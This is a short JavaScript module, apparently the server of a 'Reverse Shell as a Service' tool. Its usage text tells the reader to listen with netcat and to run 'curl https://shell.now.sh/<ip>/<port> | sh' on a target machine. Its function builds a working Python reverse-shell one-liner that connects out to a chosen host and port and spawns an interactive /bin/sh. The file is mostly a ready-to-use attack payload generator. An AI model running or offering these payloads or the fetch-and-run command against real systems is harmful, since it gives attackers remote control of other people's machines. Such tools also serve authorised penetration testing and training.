'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine, open up a port and listen to it with netcat
#      nc -l 1337
#
# 2. On the target machine, pipe the output of https://shell.now.sh/yourhostnameorip/port into sh
#      curl https://shell.now.sh/192.168.0.69/1337 | sh
#
# 3. Don't be a dick`;

const generatePayload = (host, port) => `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`;

const reverseShell = req => {
	const [, host, port] = req.url.split('/');
	return (host && port) ? generatePayload(host, port) : usage;
};

module.exports = reverseShell;
